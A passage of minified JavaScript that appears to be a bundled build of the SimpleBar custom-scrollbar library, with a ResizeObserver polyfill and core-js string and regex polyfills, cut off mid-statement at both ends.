t=this.observers_,n=t.indexOf(e);~n&&t.splice(n,1),!t.length&&this.connected_&&this.disconnect_()},e.prototype.refresh=function(){this.updateObservers_()&&this.refresh()},e.prototype.updateObservers_=function(){var e=this.observers_.filter((function(e){return e.gatherActive(),e.hasActive()}));return e.forEach((function(e){return e.broadcastActive()})),0<e.length},e.prototype.connect_=function(){$r&&!this.connected_&&(document.addEventListener("transitionend",this.onTransitionEnd_),window.addEventListener("resize",this.refresh),Qr?(this.mutationsObserver_=new MutationObserver(this.refresh),this.mutationsObserver_.observe(document,{attributes:!0,childList:!0,characterData:!0,subtree:!0})):(document.addEventListener("DOMSubtreeModified",this.refresh),this.mutationEventsAdded_=!0),this.connected_=!0)},e.prototype.disconnect_=function(){$r&&this.connected_&&(document.removeEventListener("transitionend",this.onTransitionEnd_),window.removeEventListener("resize",this.refresh),this.mutationsObserver_&&this.mutationsObserver_.disconnect(),this.mutationEventsAdded_&&document.removeEventListener("DOMSubtreeModified",this.refresh),this.mutationsObserver_=null,this.mutationEventsAdded_=!1,this.connected_=!1)},e.prototype.onTransitionEnd_=function(e){var t=e.propertyName,n=void 0===t?"":t;Vr.some((function(e){return!!~n.indexOf(e)}))&&this.refresh()},e.getInstance=function(){return this.instance_||(this.instance_=new e),this.instance_},e.instance_=null,e}(),Wr=function(e,t){for(var n=0,r=Object.keys(t);n<r.length;n++){var i=r[n];Object.defineProperty(e,i,{value:t[i],enumerable:!1,writable:!1,configurable:!0})}return e},Kr=function(e){return e&&e.ownerDocument&&e.ownerDocument.defaultView||zr},qr=ei(0,0,0,0);function Xr(e){return parseFloat(e)||0}function Yr(e){for(var t=[],n=1;n<arguments.length;n++)t[n-1]=arguments[n];return t.reduce((function(t,n){return t+Xr(e["border-"+n+"-width"])}),0)}var Jr="undefined"!=typeof SVGGraphicsElement?function(e){return e instanceof Kr(e).SVGGraphicsElement}:function(e){return e instanceof Kr(e).SVGElement&&"function"==typeof e.getBBox};function Zr(e){return $r?Jr(e)?ei(0,0,(t=e.getBBox()).width,t.height):function(e){var t=e.clientWidth,n=e.clientHeight;if(!t&&!n)return qr;var r,i=Kr(e).getComputedStyle(e),a=function(e){for(var t={},n=0,r=["top","right","bottom","left"];n<r.length;n++){var i=r[n],a=e["padding-"+i];t[i]=Xr(a)}return t}(i),o=a.left+a.right,s=a.top+a.bottom,l=Xr(i.width),c=Xr(i.height);if("border-box"===i.boxSizing&&(Math.round(l+o)!==t&&(l-=Yr(i,"left","right")+o),Math.round(c+s)!==n&&(c-=Yr(i,"top","bottom")+s)),(r=e)!==Kr(r).document.documentElement){var u=Math.round(l+o)-t,d=Math.round(c+s)-n;1!==Math.abs(u)&&(l-=u),1!==Math.abs(d)&&(c-=d)}return ei(a.left,a.top,l,c)}(e):qr;var t}function ei(e,t,n,r){return{x:e,y:t,width:n,height:r}}var ti=function(){function e(e){this.broadcastWidth=0,this.broadcastHeight=0,this.contentRect_=ei(0,0,0,0),this.target=e}return e.prototype.isActive=function(){var e=Zr(this.target);return(this.contentRect_=e).width!==this.broadcastWidth||e.height!==this.broadcastHeight},e.prototype.broadcastRect=function(){var e=this.contentRect_;return this.broadcastWidth=e.width,this.broadcastHeight=e.height,e},e}(),ni=function(e,t){var n,r,i,a,o,s,l,c=(r=(n=t).x,i=n.y,a=n.width,o=n.height,s="undefined"!=typeof DOMRectReadOnly?DOMRectReadOnly:Object,l=Object.create(s.prototype),Wr(l,{x:r,y:i,width:a,height:o,top:i,right:r+a,bottom:o+i,left:r}),l);Wr(this,{target:e,contentRect:c})},ri=function(){function e(e,t,n){if(this.activeObservations_=[],this.observations_=new Ur,"function"!=typeof e)throw new TypeError("The callback provided as parameter 1 is not a function.");this.callback_=e,this.controller_=t,this.callbackCtx_=n}return e.prototype.observe=function(e){if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");if("undefined"!=typeof Element&&Element instanceof Object){if(!(e instanceof Kr(e).Element))throw new TypeError('parameter 1 is not of type "Element".');var t=this.observations_;t.has(e)||(t.set(e,new ti(e)),this.controller_.addObserver(this),this.controller_.refresh())}},e.prototype.unobserve=function(e){if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");if("undefined"!=typeof Element&&Element instanceof Object){if(!(e instanceof Kr(e).Element))throw new TypeError('parameter 1 is not of type "Element".');var t=this.observations_;t.has(e)&&(t.delete(e),t.size||this.controller_.removeObserver(this))}},e.prototype.disconnect=function(){this.clearActive(),this.observations_.clear(),this.controller_.removeObserver(this)},e.prototype.gatherActive=function(){var e=this;this.clearActive(),this.observations_.forEach((function(t){t.isActive()&&e.activeObservations_.push(t)}))},e.prototype.broadcastActive=function(){if(this.hasActive()){var e=this.callbackCtx_,t=this.activeObservations_.map((function(e){return new ni(e.target,e.broadcastRect())}));this.callback_.call(e,t,e),this.clearActive()}},e.prototype.clearActive=function(){this.activeObservations_.splice(0)},e.prototype.hasActive=function(){return 0<this.activeObservations_.length},e}(),ii="undefined"!=typeof WeakMap?new WeakMap:new Ur,ai=function e(t){if(!(this instanceof e))throw new TypeError("Cannot call a class as a function.");if(!arguments.length)throw new TypeError("1 argument required, but only 0 present.");var n=Gr.getInstance(),r=new ri(t,n,this);ii.set(this,r)};["observe","unobserve","disconnect"].forEach((function(e){ai.prototype[e]=function(){var t;return(t=ii.get(this))[e].apply(t,arguments)}}));var oi=void 0!==zr.ResizeObserver?zr.ResizeObserver:ai,si=function(e){return function(t,n,r,i){Be(n);var a=Te(t),o=g(a),s=se(a.length),l=e?s-1:0,c=e?-1:1;if(r<2)for(;;){if(l in o){i=o[l],l+=c;break}if(l+=c,e?l<0:s<=l)throw TypeError("Reduce of empty array with no initial value")}for(;e?0<=l:l<s;l+=c)l in o&&(i=n(i,o[l],l,a));return i}},li=[si(!1),si(!0)][0];Me({target:"Array",proto:!0,forced:$e("reduce")},{reduce:function(e){return li(this,e,arguments.length,1<arguments.length?arguments[1]:void 0)}});var ci=F.f,ui=Function.prototype,di=ui.toString,pi=/^\s*function ([^ (]*)/;!u||"name"in ui||ci(ui,"name",{configurable:!0,get:function(){try{return di.call(this).match(pi)[1]}catch(e){return""}}});var hi,fi,Ai=RegExp.prototype.exec,mi=String.prototype.replace,vi=Ai,gi=(hi=/a/,fi=/b*/g,Ai.call(hi,"a"),Ai.call(fi,"a"),0!==hi.lastIndex||0!==fi.lastIndex),yi=void 0!==/()??/.exec("")[1];(gi||yi)&&(vi=function(e){var t,n,r,i;return yi&&(n=new RegExp("^"+this.source+"$(?!\\s)",function(){var e=P(this),t="";return e.global&&(t+="g"),e.ignoreCase&&(t+="i"),e.multiline&&(t+="m"),e.dotAll&&(t+="s"),e.unicode&&(t+="u"),e.sticky&&(t+="y"),t}.call(this))),gi&&(t=this.lastIndex),r=Ai.call(this,e),gi&&r&&(this.lastIndex=this.global?r.index+r[0].length:t),yi&&r&&1<r.length&&mi.call(r[0],n,(function(){for(i=1;i<arguments.length-2;i++)void 0===arguments[i]&&(r[i]=void 0)})),r});var bi=vi;Me({target:"RegExp",proto:!0,forced:/./.exec!==bi},{exec:bi});var _i=Oe("species"),wi=!c((function(){var e=/./;return e.exec=function(){var e=[];return e.groups={a:"7"},e},"7"!=="".replace(e,"$<a>")})),Ci=!c((function(){var e=/(?:)/,t=e.exec;e.exec=function(){return t.apply(this,arguments)};var n="ab".split(e);return 2!==n.length||"a"!==n[0]||"b"!==n[1]})),xi=function(e,t,n,r){var i=Oe(e),a=!c((function(){var t={};return t[i]=function(){return 7},7!=""[e](t)})),o=a&&!c((function(){var t=!1,n=/a/;return n.exec=function(){return t=!0,null},"split"===e&&(n.constructor={},n.constructor[_i]=function(){return n}),n[i](""),!t}));if(!a||!o||"replace"===e&&!wi||"split"===e&&!Ci){var s=/./[i],l=n(i,""[e],(function(e,t,n,r,i){return t.exec===bi?a&&!i?{done:!0,value:s.call(t,n,r)}:{done:!0,value:e.call(n,t,r)}:{done:!1}})),u=l[0],d=l[1];Z(String.prototype,e,u),Z(RegExp.prototype,i,2==t?function(e,t){return d.call(e,this,t)}:function(e){return d.call(e,this)}),r&&L(RegExp.prototype[i],"sham",!0)}},Si=Zt.charAt,ki=function(e,t,n){return t+(n?Si(e,t).length:1)},Mi=function(e,t){var n=e.exec;if("function"==typeof n){var r=n.call(e,t);if("object"!==_typeof2(r))throw TypeError("RegExp exec method returned something other than an Object or null");return r}if("RegExp"!==m(e))throw TypeError("RegExp#exec called on incompatible receiver");return bi.call(e,t)};xi("match",1,(function(e,t,n){return[function(t){var n=y(this),r=null==t?void 0:t[e];return void 0!==r?r.call(t,n):new RegExp(t)[e](String(n))},function(e){var r=n(t,e,this);if(r.done)return r.value;var i=P(e),a=String(this);if(!i.global)return Mi(i,a);for(var o,s=i.unicode,l=[],c=i.lastIndex=0;null!==(o=Mi(i,a));){var u=String(o[0]);""===(l[c]=u)&&(i.lastIndex=ki(a,se(i.lastIndex),s)),c++}return 0===c?null:l}]}));var Bi=Math.max,Ei=Math.min,Ti=Math.floor,Pi=/\$([$&'`]|\d\d?|<[^>]*>)/g,Ii=/\$([$&'`]|\d\d?)/g;xi("replace",2,(function(e,t,n){return[function(n,r){var i=y(this),a=null==n?void 0:n[e];return void 0!==a?a.call(n,i,r):t.call(String(i),n,r)},function(e,i){var a=n(t,e,this,i);if(a.done)return a.value;var o=P(e),s=String(this),l="function"==typeof i;l||(i=String(i));var c=o.global;if(c){var u=o.unicode;o.lastIndex=0}for(var d=[];;){var p=Mi(o,s);if(null===p)break;if(d.push(p),!c)break;""===String(p[0])&&(o.lastIndex=ki(s,se(o.lastIndex),u))}for(var h,f="",A=0,m=0;m<d.length;m++){p=d[m];for(var v=String(p[0]),g=Bi(Ei(ae(p.index),s.length),0),y=[],b=1;b<p.length;b++)y.push(void 0===(h=p[b])?h:String(h));var _=p.groups;if(l){var w=[v].concat(y,g,s);void 0!==_&&w.push(_);var C=String(i.apply(void 0,w))}else C=r(v,s,g,y,_,i);A<=g&&(f+=s.slice(A,g)+C,A=g+v.length)}return f+s.slice(A)}];function r(e,n,r,i,a,o){var s=r+e.length,l=i.length,c=Ii;return void 0!==a&&(a=Te(a),c=Pi),t.call(o,c,(function(t,o){var c;switch(o.charAt(0)){case"$":return"$";case"&":return e;case"`":return n.slice(0,r);case"'":return n.slice(s);case"<":c=a[o.slice(1,-1)];break;default:var u=+o;if(0===u)return t;if(l<u){var d=Ti(u/10);return 0===d?t:d<=l?void 0===i[d-1]?o.charAt(1):i[d-1]+o.charAt(1):t}c=i[u-1]}return void 0===c?"":c}))}}));var Fi=function(e){return Array.prototype.reduce.call(e,(function(e,t){var n=t.name.match(/data-simplebar-(.+)/);if(n){var r=n[1].replace(/\W+(.)/g,(function(e,t){return t.toUpperCase()}));switch(t.value){case"true":e[r]=!0;break;case"false":e[r]=!1;break;case void 0:e[r]=!0;break;default:e[r]=t.value}}return e}),{})};function Li(e){return e&&e.ownerDocument&&e.ownerDocument.defaultView?e.ownerDocument.defaultView:window}function Oi(e){return e&&e.ownerDocument?e.ownerDocument:document}var Ni=null,Di=null;function Ri(e){if(null===Ni){var t=Oi(e);if(void 0===t)return Ni=0;var n=t.body,r=t.createElement("div");r.classList.add("simplebar-hide-scrollbar"),n.appendChild(r);var i=r.getBoundingClientRect().right;n.removeChild(r),Ni=i}return Ni}Ke&&window.addEventListener("resize",(function(){Di!==window.devicePixelRatio&&(Di=window.devicePixelRatio,Ni=null)}));var ji=function(){function e(t,n){var r=this;this.onScroll=function(){var e=Li(r.el);r.scrollXTicking||(e.requestAnimationFrame(r.scrollX),r.scrollXTicking=!0),r.scrollYTicking||(e.requestAnimationFrame(r.scrollY),r.scrollYTicking=!0)},this.scrollX=function(){r.axis.x.isOverflowing&&(r.showScrollbar("x"),r.positionScrollbar("x")),r.scrollXTicking=!1},this.scrollY=function(){r.axis.y.isOverflowing&&(r.showScrollbar("y"),r.positionScrollbar("y")),r.scrollYTicking=!1},this.onMouseEnter=function(){r.showScrollbar("x"),r.showScrollbar("y")},this.onMouseMove=function(e){r.mouseX=e.clientX,r.mouseY=e.clientY,(r.axis.x.isOverflowing||r.axis.x.forceVisible)&&r.onMouseMoveForAxis("x"),(r.axis.y.isOverflowing||r.axis.y.forceVisible)&&r.onMouseMoveForAxis("y")},this.onMouseLeave=function(){r.onMouseMove.cancel(),(r.axis.x.isOverflowing||r.axis.x.forceVisible)&&r.onMouseLeaveForAxis("x"),(r.axis.y.isOverflowing||r.axis.y.forceVisible)&&r.onMouseLeaveForAxis("y"),r.mouseX=-1,r.mouseY=-1},this.onWindowResize=function(){r.scrollbarWidth=r.getScrollbarWidth(),r.hideNativeScrollbar()},this.hideScrollbars=function(){r.axis.x.track.rect=r.axis.x.track.el.getBoundingClientRect(),r.axis.y.track.rect=r.axis.y.track.el.getBoundingClientRect(),r.isWithinBounds(r.axis.y.track.rect)||(r.axis.y.scrollbar.el.classList.remove(r.classNames.visible),r.axis.y.isVisible=!1),r.isWithinBounds(r.axis.x.track.rect)||(r.axis.x.scrollbar.el.classList.remove(r.classNames.visible),r.axis.x.isVisible=!1)},this.onPointerEvent=function(e){var t,n;r.axis.x.track.rect=r.axis.x.track.el.getBoundingClientRect(),r.axis.y.track.rect=r.axis.y.track.el.getBoundingClientRect(),(r.axis.x.isOverflowing||r.axis.x.forceVisible)&&(t=r.isWithinBounds(r.axis.x.track.rect)),(r.axis.y.isOverflowing||r.axis.y.forceVisible)&&(n=r.isWithinBounds(r.axis.y.track.rect)),(t||n)&&(e.preventDefault(),e.stopPropagation(),"mousedown"===e.type&&(t&&(r.axis.x.scrollbar.rect=r.axis.x.scrollbar.el.getBoundingClientRect(),r.isWithinBounds(r.axis.x.scrollbar.rect)?r.onDragStart(e,"x"):r.onTrackClick(e,"x")),n&&(r.axis.y.scrollbar.rect=r.axis.y.scrollbar.el.getBoundingClientRect(),r.isWithinBounds(r.axis.y.scrollbar.rect)?r.onDragStart(e,"y"):r.onTrackClick(e,"y"))))},this.drag=function(t){var n=r.axis[r.draggedAxis].track,i=n.rect[r.axis[r.draggedAxis].sizeAttr],a=r.axis[r.draggedAxis].scrollbar,o=r.contentWrapperEl[r.axis[r.draggedAxis].scrollSizeAttr],s=parseInt(r.elStyles[r.axis[r.draggedAxis].sizeAttr],10);t.preventDefault(),t.stopPropagation();var l=(("y"===r.draggedAxis?t.pageY:t.pageX)-n.rect[r.axis[r.draggedAxis].offsetAttr]-r.axis[r.draggedAxis].dragOffset)/(i-a.size)*(o-s);"x"===r.draggedAxis&&(l=r.isRtl&&e.getRtlHelpers().isRtlScrollbarInverted?l-(i+a.size):l,l=r.isRtl&&e.getRtlHelpers().isRtlScrollingInverted?-l:l),r.contentWrapperEl[r.axis[r.draggedAxis].scrollOffsetAttr]=l},this.onEndDrag=function(e){var t=Oi(r.el),n=Li(r.el);e.preventDefault(),e.stopPropagation(),r.el.classList.remove(r.classNames.dragging),t.removeEventListener("mousemove",r.drag,!0),t.removeEventListener("mouseup",r.onEndDrag,!0),r.removePreventClickId=n.setTimeout((function(){t.removeEventListener("click",r.preventClick,!0),t.removeEventListener("dblclick",r.preventClick,!0),r.removePreventClickId=null}))},this.preventClick=function(e){e.preventDefault(),e.stopPropagation()},this.el=t,this.minScrollbarWidth=20,this.options=Object.assign({},e.defaultOptions,{},n),this.classNames=Object.assign({},e.defaultOptions.classNames,{},this.options.classNames),this.axis={x:{scrollOffsetAttr:"scrollLeft",sizeAttr:"width",scrollSizeAttr:"scrollWidth",offsetSizeAttr:"offsetWidth",offsetAttr:"left",overflowAttr:"overflowX",dragOffset:0,isOverflowing:!0,isVisible:!1,forceVisible:!1,track:{},scrollbar:{}},y:{scrollOffsetAttr:"scrollTop",sizeAttr:"height",scrollSizeAttr:"scrollHeight",offsetSizeAttr:"offsetHeight",offsetAttr:"top",overflowAttr:"overflowY",dragOffset:0,isOverflowing:!0,isVisible:!1,forceVisible:!1,track:{},scrollbar:{}}},this.removePreventClickId=null,e.instances.has(this.el)||(this.recalculate=Yn(this.recalculate.bind(this),64),this.onMouseMove=Yn(this.onMouseMove.bind(this),64),this.hideScrollbars=hr(this.hideScrollbars.bind(this),this.options.timeout),this.onWindowResize=hr(this.onWindowResize.bind(this),64,{leading:!0}),e.getRtlHelpers=jr(e.getRtlHelpers),this.init())}e.getRtlHelpers=function(){var t=document.createElement("div");t.innerHTML='<div class="hs-dummy-scrollbar-size"><div style="height: 200%; width: 200%; margin: 10px 0;"></div></div>';var n=t.firstElementChild;document.body.appendChild(n);var r=n.firstElementChild;n.scrollLeft=0;var i=e.getOffset(n),a=e.getOffset(r);n.scrollLeft=999;var o=e.getOffset(r);return{isRtlScrollingInverted:i.left!==a.left&&a.left-o.left!=0,isRtlScrollbarInverted:i.left!==a.left}},e.getOffset=function(e){var t=e.getBoundingClientRect(),n=Oi(e),r=Li(e);return{top:t.top+(r.pageYOffset||n.documentElement.scrollTop),left:t.left+(r.pageXOffset||n.documentElement.scrollLeft)}};var t=e.prototype;return t.init=function(){e.instances.set(this.el,this),Ke&&(this.initDOM(),this.scrollbarWidth=this.getScrollbarWidth(),this.recalculate(),this.initListeners())},t.initDOM=function(){var e=this;if(Array.prototype.filter.call(this.el.children,(function(t){return t.classList.contains(e.classNames.wrapper)})).length)this.wrapperEl=this.el.querySelector("."+this.classNames.wrapper),this.contentWrapperEl=this.options.scrollableNode||this.el.querySelector("."+this.classNames.contentWrapper),this.contentEl=this.options.contentNode||this.el.querySelector("."+this.classNames.contentEl),this.offsetEl=this.el.querySelector("."+this.classNames.offset),this.maskEl=this.el.querySelector("."+this.classNames.mask),this.placeholderEl=this.findChild(this.wrapperEl,"."+this.classNames.placeholder),this.heightAutoObserverWrapperEl=this.el.querySelector("."+this.classNames.heightAutoObserverWrapperEl),this.heightAutoObserverEl=this.el.querySelector("."+this.classNames.heightAutoObserverEl),this.axis.x.track.el=this.findChild(this.el,"."+this.classNames.track+"."+this.classNames.horizontal),this.axis.y.track.el=this.findChild(this.el,"."+this.classNames.track+"."+this.classNames.vertical);else{for(this.wrapperEl=document.createElement("div"),this.contentWrapperEl=document.createElement("div"),this.offsetEl=document.createElement("div"),this.maskEl=document.createElement("div"),this.contentEl=document.createElement("div"),this.placeholderEl=document.createElement("div"),this.heightAutoObserverWrapperEl=document.createElement("div"),this.heightAutoObserverEl=document.createElement("div"),this.wrapperEl.classList.add(this.classNames.wrapper),this.contentWrapperEl.classList.add(this.classNames.contentWrapper),this.offsetEl.classList.add(this.classNames.offset),this.maskEl.classList.add(this.classNames.mask),this.contentEl.classList.add(this.classNames.contentEl),this.placeholderEl.classList.add(this.classNames.placeholder),this.heightAutoObserverWrapperEl.classList.add(this.classNames.heightAutoObserverWrapperEl),this.heightAutoObserverEl.classList.add(this.classNames.heightAutoObserverEl);this.el.firstChild;)this.contentEl.appendChild(this.el.firstChild);this.contentWrapperEl.appendChild(this.contentEl),this.offsetEl.appendChild(this.contentWrapperEl),this.maskEl.appendChild(this.offsetEl),this.heightAutoObserverWrapperEl.appendChild(this.heightAutoObserverEl),this.wrapperEl.appendChild(this.heightAutoObserverWrapperEl),this.wrapperEl.appendChild(this.maskEl),this.wrapperEl.appendChild(this.placeholderEl),this.el.appendChild(this.wrapperEl)}if(!this.axis.x.track.el||!this.axis.y.track.el){var t=document.createElement("div"),n=document.createElement("div");t.classList.add(this.classNames.track),n.classList.add(this.classNames.scrollbar),t.appendChild(n),this.axis.x.track.el=t.cloneNode(!0),this.axis.x.track.el.classList.add(this.classNames.horizontal),this.axis.y.track.el=t.cloneNode(!0),this.axis.y.track.el.classList.add(this.classNames.vertical),this.el.appendChild(this.axis.x.track.el),this.el.appendChild(this.axis.y.track.el)}this.axis.x.scrollbar.el=this.axis.x.track.el.querySelector("."+this.classNames.scrollbar),this.axis.y.scrollbar.el=this.axis.y.track.el.querySelector("."+this.classNames.scrollbar),this.options.autoHide||(this.axis.x.scrollbar.el.classList.add(this.classNames.visible),this.axis.y.scrollbar.el.classList.add(this.classNames.visible)),this.el.setAttribute("data-simplebar","init")},t.initListeners=function(){var e=this,t=Li(this.el);this.options.autoHide&&this.el.addEventListener("mouseenter",this.onMouseEnter),["mousedown","click","dblclick"].forEach((function(t){e.el.addEventListener(t,e.onPointerEvent,!0)})),["touchstart","touchend","touchmove"].forEach((function(t){e.el.addEventListener(t,e.onPointerEvent,{capture:!0,passive:!0})})),this.el.addEventListener("mousemove",this.onMouseMove),this.el.addEventListener("mouseleave",this.onMouseLeave),this.contentWrapperEl.addEventListener("scroll",this.onScroll),t.addEventListener("resize",this.onWindowResize);var n=!1,r=t.ResizeObserver||oi;this.resizeObserver=new r((function(){n&&e.recalculate()})),this.resizeObserver.observe(this.el),this.resizeObserver.observe(this.contentEl),t.requestAnimationFrame((function(){n=!0})),this.mutationObserver=new t.MutationObserver(this.recalculate),this.mutationObserver.observe(this.contentEl,{childList:!0,subtree:!0,characterData:!0})},t.recalculate=function(){var e=Li(this.el);this.elStyles=e.getComputedStyle(this.el),this.isRtl="rtl"===this.elStyles.direction;var t=this.heightAutoObserverEl.offsetHeight<=1,n=this.heightAutoObserverEl.offsetWidth<=1,r=this.contentEl.offsetWidth,i=this.contentWrapperEl.offsetWidth,a=this.elStyles.overflowX,o=this.elStyles.overflowY;this.contentEl.style.padding=this.elStyles.paddingTop+" "+this.elStyles.paddingRight+" "+this.elStyles.paddingBottom+" "+this.elStyles.paddingLeft,this.wrapperEl.style.margin="-"+this.elStyles.paddingTop+" -"+this.elStyles.paddingRight+" -"+this.elStyles.paddingBottom+" -"+this.elStyles.paddingLeft;var s=this.contentEl.scrollHeight,l=this.contentEl.scrollWidth;this.contentWrapperEl.style.height=t?"auto":"100%",this.placeholderEl.style.width=n?r+"px":"auto",this.placeholderEl.style.height=s+"px";var c=this.contentWrapperEl.offsetHeight;this.axis.x.isOverflowing=r<l,this.axis.y.isOverflowing=c<s,this.axis.x.isOverflowing="hidden"!==a&&this.axis.x.isOverflowing,this.axis.y.isOverflowing="hidden"!==o&&this.axis.y.isOverflowing,this.axis.x.forceVisible="x"===this.options.forceVisible||!0===this.options.forceVisible,this.axis.y.forceVisible="y"===this.options.forceVisible||!0===this.options.forceVisible,this.hideNativeScrollbar();var u=this.axis.x.isOverflowing?this.scrollbarWidth:0,d=this.axis.y.isOverflowing?this.scrollbarWidth:0;this.axis.x.isOverflowing=this.axis.x.isOverflowing&&i-d<l,this.axis.y.isOverflowing=this.axis.y.isOverflowing&&c-u<s,this.axis.x.scrollbar.size=this.getScrollbarSize("x"),this.axis.y.scrollbar.size=this.getScrollbarSize("y"),this.axis.x.scrollbar.el.style.width=this.axis.x.scrollbar.size+"px",this.axis.y.scrollbar.el.style.height=this.axis.y.scrollbar.size+"px",this.positionScrollbar("x"),this.positionScrollbar("y"),this.toggleTrackVisibility("x"),this.toggleTrackVisibility("y")},t.getScrollbarSize=function(e){if(void 0===e&&(e="y"),!this.axis[e].isOverflowing)return 0;var t,n=this.contentEl[this.axis[e].scrollSizeAttr],r=this.axis[e].track.el[this.axis[e].offsetSizeAttr],i=r/n;return t=Math.max(~~(i*r),this.options.scrollbarMinSize),this.options.scrollbarMaxSize&&(t=Math.min(t,this.options.scrollbarMaxSize)),t},t.positionScrollbar=function(t){if(void 0===t&&(t="y"),this.axis[t].isOverflowing){var n=this.contentWrapperEl[this.axis[t].scrollSizeAttr],r=this.axis[t].track.el[this.axis[t].offsetSizeAttr],i=parseInt(this.elStyles[this.axis[t].sizeAttr],10),a=this.axis[t].scrollbar,o=this.contentWrapperEl[this.axis[t].scrollOffsetAttr],s=(o="x"===t&&this.isRtl&&e.getRtlHelpers().isRtlScrollingInverted?-o:o)/(n-i),l=~~((r-a.size)*s);l="x"===t&&this.isRtl&&e.getRtlHelpers().isRtlScrollbarInverted?l+(r-a.size):l,a.el.style.transform="x"===t?"translate3d("+l+"px, 0, 0)":"translate3d(0, "+l+"px, 0)"}},t.toggleTrackVisibility=function(e){void 0===e&&(e="y");var t=this.axis[e].track.el,n=this.axis[e].scrollbar.el;this.axis[e].isOverflowing||this.axis[e].forceVisible?(t.style.visibility="visible",this.contentWrapperEl.style[this.axis[e].overflowAttr]="scroll"):(t.style.visibility="hidden",this.contentWrapperEl.style[this.axis[e].overflowAttr]="hidden"),this.axis[e].isOverflowing?n.style.display="block":n.style.display="none"},t.hideNativeScrollbar=function(){this.offsetEl.style[this.isRtl?"left":"right"]=this.axis.y.isOverflowing||this.axis.y.forceVisible?"-"+this.scrollbarWidth+"px":0,this.offsetEl.style.bottom=this.axis.x.isOverflowing||this.axis.x.forceVisible?"-"+this.scrollbarWidth+"px":0},t.onMouseMoveForAxis=function(e){void 0===e&&(e="y"),this.axis[e].track.rect=this.axis[e].track.el.getBoundingClientRect(),this.axis[e].scrollbar.rect=this.axis[e].scrollbar.el.getBoundingClientRect(),this.isWithinBounds(this.axis[e].scrollbar.rect)?this.axis[e].scrollbar.el.classList.add(this.classNames.hover):this.axis[e].scrollbar.el.classList.remove(this.classNames.hover),this.isWithinBounds(this.axis[e].track.rect)?(this.showScrollbar(e),this.axis[e].track.el.classList.add(this.classNames.hover)):this.axis[e].track.el.classList.remove(this.classNames.hover)},t.onMouseLeaveForAxis=function(e){void 0===e&&(e="y"),this.axis[e].track.el.classList.remove(this.classNames.hover),this.axis[e].scrollbar.el.classList.remove(this.classNames.hover)},t.showScrollbar=function(e){void 0===e&&(e="y");var t=this.axis[e].scrollbar.el;this.axis[e].isVisible||(t.classList.add(this.classNames.visible),this.axis[e].isVisible=!0),this.options.autoHide&&this.hideScrollbars()},t.onDragStart=function(e,t){void 0===t&&(t="y");var n=Oi(this.el),r=Li(this.el),i=this.axis[t].scrollbar,a="y"===t?e.pageY:e.pageX;this.axis[t].dragOffset=a-i.rect[this.axis[t].offsetAttr],this.draggedAxis=t,this.el.classList.add(this.classNames.dragging),n.addEventListener("mousemove",this.drag,!0),n.addEventListener("mouseup",this.onEndDrag,!0),null===this.removePreventClickId?(n.addEventListener("click",this.preventClick,!0),n.addEventListener("dblclick",this.preventClick,!0)):(r.clearTimeout(this.removePreventClickId),this.removePreventClickId=null)},t.onTrackClick=function(e,t){var n=this;if(void 0===t&&(t="y"),this.options.clickOnTrack){var r=Li(this.el);this.axis[t].scrollbar.rect=this.axis[t].scrollbar.el.getBoundingClientRect();var i=this.axis[t].scrollbar.rect[this.axis[t].offsetAttr],a=parseInt(this.elStyles[this.axis[t].sizeAttr],10),o=this.contentWrapperEl[this.axis[t].scrollOffsetAttr],s=("y"===t?this.mouseY-i:this.mouseX-i)<0?-1:1,l=-1===s?o-a:o+a;!function e(){var i,a;-1===s?l<o&&(o-=n.options.clickOnTrackSpeed,n.contentWrapperEl.scrollTo(((i={})[n.axis[t].offsetAttr]=o,i)),r.requestAnimationFrame(e)):o<l&&(o+=n.options.clickOnTrackSpeed,n.contentWrapperEl.scrollTo(((a={})[n.axis[t].offsetAttr]=o,a)),r.requestAnimationFrame(e))}()}},t.getContentElement=function(){return this.contentEl},t.getScrollElement=function(){return this.contentWrapperEl},t.getScrollbarWidth=function(){try{return"none"===getComputedStyle(this.contentWrapperEl,"::-webkit-scrollbar").display||"scrollbarWidth"in document.documentElement.style||"-ms-overflow-style"in document.documentElement.style?0:Ri(this.el)}catch(e){return Ri(this.el)}},t.removeListeners=function(){var e=this,t=Li(this.el);this.options.autoHide&&this.el.removeEventListener("mouseenter",this.onMouseEnter),["mousedown","click","dblclick"].forEach((function(t){e.el.removeEventListener(t,e.onPointerEvent,!0)})),["touchstart","touchend","touchmove"].forEach((function(t){e.el.removeEventListener(t,e.onPointerEvent,{capture:!0,passive:!0})})),this.el.removeEventListener("mousemove",this.onMouseMove),this.el.removeEventListener("mouseleave",this.onMouseLeave),this.contentWrapperEl&&this.contentWrapperEl.removeEventListener("scroll",this.onScroll),t.removeEventListener("resize",this.onWindowResize),this.mutationObserver&&this.mutationObserver.disconnect(),this.resizeObserver&&this.resizeObserver.disconnect(),this.recalculate.cancel(),this.onMouseMove.cancel(),this.hideScrollbars.cancel(),this.onWindowResize.cancel()},t.unMount=function(){this.removeListeners(),e.instances.delete(this.el)},t.isWithinBounds=function(e){return this.mouseX>=e.left&&this.mouseX<=e.left+e.width&&this.mouseY>=e.top&&this.mouseY<=e.top+e.height},t.findChild=function(e,t){var n=e.matches||e.webkitMatchesSelector||e.mozMatchesSelector||e.msMatchesSelector;return Array.prototype.filter.call(e.children,(function(e){return n.call(e,t)}))[0]},e}();return ji.defaultOptions={autoHide:!0,forceVisible:!1,clickOnTrack:!0,clickOnTrackSpeed:40,classNames:{contentEl:"simplebar-content",contentWrapper:"simplebar-content-wrapper",offset:"simplebar-offset",mask:"simplebar-mask",wrapper:"simplebar-wrapper",placeholder:"simplebar-placeholder",scrollbar:"simplebar-scrollbar",track:"simplebar-track",heightAutoObserverWrapperEl:"simplebar-height-auto-observer-wrapper",heightAutoObserverEl:"simplebar-height-auto-observer",visible:"simplebar-visible",horizontal:"simplebar-horizontal",vertical:"simplebar-vertical",hover:"simplebar-hover",dragging:"simplebar-dragging"},scrollbarMinSize:25,scrollbarMaxSize:0,timeout:1e3},ji.instances=new WeakMap,ji.initDOMLoadedElements=function(){document.removeEventListener("DOMContentLoaded",this.initDOMLoadedElements),window.removeEventListener("load",this.initDOMLoadedElements),Array.prototype.forEach.call(document.querySelectorAll("[data-simplebar]"),(function(e){"init"===e.getAttribute("data-simplebar")||ji.instances.has(e)||new ji(e,Fi(e.attributes))}))},ji.removeObserver=function(){this.globalObserver.disconnect()},ji.initHtmlApi=function(){this.initDOMLoadedElements=this.initDOMLoadedElements.bind(this),"undefined"!=typeof MutationObserver&&(this.globalObserver=new 